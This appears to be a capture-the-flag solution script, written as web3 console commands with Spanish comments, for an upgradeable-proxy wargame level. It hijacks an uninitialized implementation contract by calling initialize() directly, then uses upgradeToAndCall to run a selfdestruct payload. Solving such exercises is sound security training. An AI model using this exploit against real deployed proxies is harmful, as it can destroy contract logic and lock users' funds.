implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
"0x000000000000000000000000c5ca2ad3ace52cf516d7c519cfb0ce7337618941"

implAddr = '0x' + implAddr.slice(-40)
"0xc5ca2ad3ace52cf516d7c519cfb0ce7337618941"

initializeData = web3.eth.abi.encodeFunctionSignature("initialize()") //ejecuto directo en engine sin pasar por proxy
await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })//ahora upgrader soy yo dado que soy el msg.sender

//Verifico que soy el upgrader
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()


//crea contrato con seldestruct:
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract BombEngine {
    function explode() public {
        selfdestruct(address(0));
    }
}


//Llamamos a explode()
bombAddr = '0xda7E21F97D9F9A1272674E9e2B6Aa767541c694e' //direccion BombEngine
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}
upgradeParams = [bombAddr, explodeData]
upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})


